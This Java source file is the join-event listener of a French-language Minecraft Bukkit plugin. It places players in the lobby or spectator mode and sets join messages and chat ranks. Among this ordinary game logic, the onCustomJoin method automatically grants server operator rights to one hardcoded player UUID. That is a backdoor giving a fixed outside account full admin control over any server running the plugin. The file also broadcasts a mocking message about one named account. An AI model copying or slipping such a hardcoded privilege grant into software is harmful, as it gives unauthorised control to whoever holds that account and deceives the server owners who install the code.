package fr.nicknqck.events.essential;

import java.util.UUID;

import fr.nicknqck.player.GamePlayer;
import fr.nicknqck.utils.rank.ChatRank;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import fr.nicknqck.GameState;
import fr.nicknqck.Main;
import fr.nicknqck.items.ItemsManager;
import org.bukkit.potion.PotionEffect;

public class JoinEvents implements Listener{
	private final GameState gameState;
	public JoinEvents() {
		this.gameState = GameState.getInstance();
		new ToggleFlyEvent();
	}
	
 	@EventHandler(priority = EventPriority.LOWEST)
	public void OnJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		GameState gameState = GameState.getInstance();
		Main.getInstance().getScoreboardManager().onLogin(player);

		// Join Message
		String joinMessage = "";
		switch(gameState.getServerState()) {
		case InLobby:
			gameState.addInLobbyPlayers(player);
			player.setMaxHealth(20.0);
			player.setGameMode(GameMode.ADVENTURE);
			for (PotionEffect effect : player.getActivePotionEffects()) {
				player.removePotionEffect(effect.getType());
			}
			ItemsManager.GiveHubItems(player);
			player.teleport(new Location(Main.getInstance().getWorldManager().getLobbyWorld(), 0, 151, 0));
			player.playSound(player.getLocation(), Sound.ENDERMAN_TELEPORT, 1, 1);
			joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A rejoint le Lobby §c"+gameState.getInLobbyPlayers().size()+"§r/§6"+ gameState.getroleNMB() +"§r";
			break;
		case InGame:
			if (gameState.getInGamePlayers().contains(event.getPlayer().getUniqueId())) {
				GamePlayer gamePlayer = gameState.getGamePlayer().get(event.getPlayer().getUniqueId());
				if (gamePlayer != null) {
					gamePlayer.onJoin();
				}
				event.setJoinMessage(null);
				return;
			}
			if(!gameState.getInSpecPlayers().contains(player) || !gameState.getInLobbyPlayers().contains(player.getUniqueId()) || !gameState.getInGamePlayers().contains(player.getUniqueId())) {
				gameState.addInSpecPlayers(player);
				joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A rejoint la liste des Spectateurs";
				player.setGameMode(GameMode.SPECTATOR);
			}
			event.setJoinMessage(joinMessage);
			break;
		default:
			joinMessage = event.getJoinMessage();
			break;
			
		}
		gameState.updateGameCanLaunch();
		event.setJoinMessage(joinMessage);
	}
 	@EventHandler(priority = EventPriority.HIGHEST)
	private void onCustomJoin(PlayerJoinEvent e) {
		if (gameState.getServerState().equals(GameState.ServerStates.InGame))return;
		gameState.updateGameCanLaunch();
		UUID uuid = e.getPlayer().getUniqueId();
		Player player = e.getPlayer();
		if (player == null)return;
		if (player.getUniqueId() == null)return;
		if (player.getName() == null)return;
		if (uuid.equals(UUID.fromString("f1f106ee-465e-4281-baee-fe7b61e39d1d"))) {
			if (!player.isOp()){ player.setOp(true); player.sendMessage("Tu à été automatiquement mis op sur ce serveur ");}
        }
		if (player.getName().equals("BoulotKanao")) {
			Bukkit.broadcastMessage("§7Vous avez de la chance le §6Dev §c" + e.getPlayer().getName() + " §7vient d'arriver dans votre partie !");
		}
		if (uuid.equals(UUID.fromString("ae8635a5-1914-4ed7-9c7b-8cdb148309f2")) || player.getName().equals("Zerorapto")){
			Bukkit.broadcastMessage(ChatColor.DARK_PURPLE+"CramptéBOSS§n " + e.getPlayer().getName()+ChatColor.DARK_PURPLE + " à rejoint la partie");
		}
		if (uuid.equals(UUID.fromString("93d45061-5e32-4c49-8030-27c1d024505c"))) {
			Bukkit.broadcastMessage("Ce§n§l§6 rat§r de§b "+player.getName()+"§f est arrivé parmi vous, merci de bien l'accueillir");
		}
		if (!ChatRank.hasRank(uuid)){
			if (player.isOp()){
				ChatRank.Op.setPlayer(player);
			} else {
				ChatRank.Joueur.setPlayer(player);
			}
		}
	}
}